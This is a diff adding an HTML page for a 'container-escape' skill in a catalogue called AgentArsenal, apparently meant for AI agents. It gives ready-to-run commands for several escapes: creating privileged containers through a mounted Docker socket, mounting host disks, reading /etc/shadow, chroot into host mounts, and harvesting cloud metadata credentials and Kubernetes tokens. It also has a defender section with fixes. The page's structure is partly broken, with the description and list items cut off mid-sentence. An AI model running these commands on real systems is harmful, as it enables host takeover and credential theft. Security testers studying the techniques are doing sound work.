@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: container-escape</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>container-escape</h2><div class="meta"><span class="badge gray">cloud</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing container escape during an authorized</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="cloud-security-basics.html">cloud-security-basics</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Docker</td><td>27.x</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>A container is not a security boundary by itself: it is processes with restricted namespaces and capabilities. When those restrictions are misconfigured (privileged mode, mounted Docker socket, dangerous capabilities, host paths), a shell inside the container becomes a shell on the host. This skill covers the authorized operator workflow: recon inside the container, the classic escape primitives, and verification, for your own labs, CTFs, and in-scope assessments only. Escapes can destabilize the host; in shared labs, use the least disruptive method that proves the point, and never escape on systems you do not have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you are in a container and identify the runtime:</li>
+<p>check <code>/.dockerenv</code>, cgroup paths, and the init process.</p>
+<li>Enumerate capabilities: <code>capsh --print</code> and look for</li>
+<p>SYS_ADMIN, SYS_PTRACE, DAC_READ_SEARCH, NET_ADMIN.</p>
+<li>Enumerate mounts: <code>mount</code>, <code>/proc/self/mountinfo</code>, and look for</li>
+<p>host paths, the Docker socket, and writable cgroup filesystems.</p>
+<li>Check for the Docker socket at <code>/var/run/docker.sock</code>; if</li>
+<p>present, the escape is usually one API call.</p>
+<li>Check for privileged mode markers (many devices in <code>/dev</code>,</li>
+<p>host-like <code>/proc</code>).</p>
+<li>Pick the matching primitive below, execute it, and verify with</li>
+<p>a host-side marker (hostname, host file read).</p>
+<li>Record the exact misconfiguration that enabled it.</li>
+<li>Clean up containers and files you created during the test.</li>
+</ol>
+<h2>1. Container reconnaissance</h2>
+<pre><code class="language-bash"># Am I in a container? (one yes is enough)
+ls -la /.dockerenv 2&gt;/dev/null &amp;&amp; echo &quot;dockerenv present&quot;
+cat /proc/1/cgroup 2&gt;/dev/null | head -5
+cat /proc/self/mountinfo | grep -m1 -o &#x27;docker[^ ]*&#x27; | head -2
+ps -p 1 -o comm=   # container init is rarely systemd
+
+# Capabilities of this shell
+capsh --print | grep -E &#x27;Current|Bounding&#x27; | head -4
+# Decode: look for cap_sys_admin, cap_sys_ptrace, cap_dac_read_search
+
+# Mounts: host paths and writable sensitive filesystems
+mount | grep -v -E &#x27;cgroup|proc |sysfs&#x27; | head -20
+cat /proc/self/mountinfo | grep -E &#x27;docker.sock|/etc|/ |/var/run&#x27; | head -10
+
+# Devices visible (many = possibly privileged)
+ls /dev/ | wc -l
+ls /dev/sd* /dev/kvm 2&gt;/dev/null
+
+# Docker socket present?
+ls -la /var/run/docker.sock 2&gt;/dev/null &amp;&amp; echo &quot;SOCKET FOUND&quot;</code></pre>
+<p>Python fallback when <code>capsh</code> is missing:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Print effective capabilities from /proc/self/status (stdlib only).&quot;&quot;&quot;
+caps = {}
+with open(&#x27;/proc/self/status&#x27;) as f:
+    for line in f:
+        if line.startswith(&#x27;Cap&#x27;):
+            k, v = line.split(&#x27;:&#x27;)
+            caps[k.strip()] = v.strip()
+print(&#x27;CapEff:&#x27;, caps.get(&#x27;CapEff&#x27;))
+# Decode bit 21 (0x200000) = CAP_SYS_ADMIN, bit 19 = CAP_SYS_PTRACE
+eff = int(caps.get(&#x27;CapEff&#x27;, &#x27;0&#x27;), 16)
+print(&#x27;CAP_SYS_ADMIN:&#x27;, bool(eff &amp; 0x200000))
+print(&#x27;CAP_SYS_PTRACE:&#x27;, bool(eff &amp; 0x80000))</code></pre>
+<h2>2. Escape via the Docker socket</h2>
+<p>A mounted Docker socket is full Docker API access as root on the host. This is the most common lab misconfiguration.</p>
+<pre><code class="language-bash"># Talk to the socket directly (no docker CLI needed)
+curl -s --unix-socket /var/run/docker.sock http://localhost/version | head -c 200
+
+# List images available on the HOST
+curl -s --unix-socket /var/run/docker.sock http://localhost/images/json \
+  | python3 -c &quot;import json,sys; [print(i[&#x27;RepoTags&#x27;]) for i in json.load(sys.stdin)]&quot;
+
+# Escape: start a container with the host root filesystem mounted
+curl -s -X POST --unix-socket /var/run/docker.sock \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;Image&quot;:&quot;alpine&quot;,&quot;Cmd&quot;:[&quot;sleep&quot;,&quot;300&quot;],&quot;HostConfig&quot;:{&quot;Binds&quot;:[&quot;/:/host&quot;],&quot;Privileged&quot;:true}}&#x27; \
+  http://localhost/containers/create?name=esc | head -c 200</code></pre>
+<p>If the <code>docker</code> CLI exists inside the container, it is shorter:</p>
+<pre><code class="language-bash">docker run -it --rm -v /:/host alpine chroot /host bash</code></pre>
+<p>Verify with a host marker: <code>cat /host/etc/hostname</code> should differ from the container&#x27;s hostname.</p>
+<h2>3. Escape via privileged mode</h2>
+<p>A <code>--privileged</code> container sees host devices and can mount the host disk directly.</p>
+<pre><code class="language-bash"># Confirm privileged: host block devices visible and mountable
+ls /dev/sd* /dev/vd* /dev/nvme* 2&gt;/dev/null
+fdisk -l 2&gt;/dev/null | grep -m2 &#x27;^Disk /dev&#x27;
+
+# Mount the host root disk (pick the right device from fdisk)
+mkdir -p /mnt/host
+mount /dev/sda1 /mnt/host 2&gt;/dev/null || mount /dev/vda1 /mnt/host
+ls /mnt/host/etc/hostname &amp;&amp; echo &quot;HOST FILESYSTEM REACHED&quot;
+cat /mnt/host/etc/shadow 2&gt;/dev/null | head -2  # proof only, do not exfiltrate</code></pre>
+<h2>4. Escape via release_agent (cgroup v1)</h2>
+<p>When the container has <code>CAP_SYS_ADMIN</code> and a writable cgroup v1 hierarchy, the kernel&#x27;s <code>release_agent</code> mechanism runs a host-side binary on cgroup release.</p>
+<pre><code class="language-bash"># Preconditions: cgroup v1 mounted writable, release_agent path writable
+cat /proc/self/mountinfo | grep cgroup | head -3
+ls -la /sys/fs/cgroup/*/release_agent 2&gt;/dev/null
+
+# Lab-only proof of concept
+mkdir -p /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+HOST_PATH=$(sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab 2&gt;/dev/null \
+  | head -1)
+# Write payload paths pointing at the host via the perdir overlap,
+# set release_agent to the payload, then trigger by emptying the cgroup.</code></pre>
+<p>The exact paths vary per host layout; the finding to report is &quot;writable cgroup v1 with CAP_SYS_ADMIN enables release_agent escape&quot;, proven by executing one harmless host-side command such as writing a marker file. Prefer the socket or privileged paths when available: they are cleaner and easier to clean up.</p>
+<h2>5. Escape via CAP_SYS_ADMIN and hostPath-style mounts</h2>
+<pre><code class="language-bash"># Writable mount of /etc or / on the host side
+cat /proc/self/mountinfo | awk &#x27;$5 ~ /^\/(etc)?$/ {print $5, $4}&#x27;
+
+# If host /etc is writable: add a cron job or systemd unit (lab only)
+# If the host root is mounted at /host: chroot straight in
+chroot /host bash -c &#x27;hostname; id&#x27;</code></pre>
+<h2>6. Information gathering that enables the next step</h2>
+<p>Even without an immediate escape, these reads shape the report and often reveal credentials for the wider environment:</p>
+<pre><code class="language-bash"># Cloud credentials from the container (metadata service is host-routed)
+TOKEN=$(curl -s -X PUT &quot;http://169.254.169.254/latest/api/token&quot; \
+  -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 60&quot; 2&gt;/dev/null)
+curl -s -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2&gt;/dev/null
+
+# Kubernetes service account token (see the kubernetes-rbac skill)
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2&gt;/dev/null \
+  | cut -c1-40
+
+# Environment variables often hold secrets in labs
+env | grep -i -E &#x27;pass|secret|token|key&#x27; | sed &#x27;s/=.*$/=&lt;redacted&gt;/&#x27;</code></pre>
+<p>Only USE harvested credentials within the authorized scope, and report them rather than exploiting beyond the agreed bounds.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>No <code>capsh</code>, no <code>curl</code>, minimal image: use the Python one-liner</li>
+<p>in section 1 and <code>/proc</code> reads, which need no tools at all.</p>
+<li>Docker socket exists but API returns 403: the socket may be a</li>
+<p>proxy with filtered endpoints; try read-only endpoints (<code>/images/json</code>, <code>/containers/json</code>) before writes.</p>
+<li>cgroup v2 only: the release_agent technique does not apply</li>
+<p>(no release_agent in v2). Check <code>/sys/fs/cgroup/cgroup.controllers</code> to confirm v2.</p>
+<li><code>mount</code> of the host disk fails with &quot;permission denied&quot; despite</li>
+<p>devices being visible: the container lacks <code>CAP_SYS_ADMIN</code>; fall back to socket or mounted-path techniques.</p>
+<li>Seccomp or AppArmor profiles can block <code>mount</code> and <code>chroot</code></li>
+<p>even in privileged containers; the denial message names the blocker, record it.</p>
+<li>The escape works but the host is a shared lab box: stop after</li>
+<p>reading one host marker file, do not drop persistence or read other users&#x27; data.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Socket filtered and no privileges: enumerate mounted secrets</li>
+<p>(section 6). A cloud instance role or Kubernetes service account is often a better pivot than a noisy kernel exploit.</p>
+<li>Check for <code>CAP_SYS_PTRACE</code>: it allows debugging host processes</li>
+<p>from inside the container in some configurations, leading to code injection into a host process.</p>
+<li>Check for <code>--pid=host</code> or <code>--network=host</code>: with host PID</li>
+<p>namespace, <code>/proc/1/root</code> is the host root filesystem: <code>ls /proc/1/root/etc/hostname</code>.</p>
+<li>Kernel exploits (dirty pipe, etc.) are the last resort: they</li>
+<p>crash hosts, they are version-specific, and they are rarely in scope. Document the patch level instead and report it as a hardening note.</p>
+<li>Containerd/CRI-O sockets (<code>/run/containerd/containerd.sock</code>)</li>
+<p>grant the same power as the Docker socket via different APIs; check for those paths too.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see container escape attempts in host audit logs: unexpected <code>mount</code> syscalls from container processes, writes to <code>release_agent</code>, Docker daemon API calls creating privileged containers with host binds, and new processes with host namespaces. Runtime security tools (Falco rules for &quot;sensitive file opened&quot; or &quot;privileged container launched&quot;, Tetragon, Sysdig) alert on exactly these primitives. The durable fixes are never mounting the Docker socket into workloads, never running <code>--privileged</code> in production, dropping all capabilities and adding back only what the app needs, read-only root filesystems, user namespaces, seccomp and AppArmor profiles, and admission control that rejects privileged pods. As the tester, prove the escape with the smallest possible host-side effect, do not install persistence, and clean up every container and file you created.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1611 (Escape to Host): the escape itself.</li>
+<li>MITRE ATT&amp;CK T1610 (Deploy Container): abusing the runtime to</li>
+<p>run attacker containers.</p>
+<li>MITRE ATT&amp;CK T1552.001 (Unsecured Credentials: Credentials In</li>
+<p>Files): mounted secrets and env vars.</p>
+<li>CWE-250 (Execution with Unnecessary Privileges): privileged</li>
+<p>containers and excess capabilities.</p>
+<li>CWE-732 (Incorrect Permission Assignment for Critical</li>
+<p>Resource): mounted socket and host paths.</p>
+<li>Docker security documentation:</li>
+<p>https://docs.docker.com/engine/security/</p>
+<li>NIST SP 800-190 (Application Container Security Guide).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
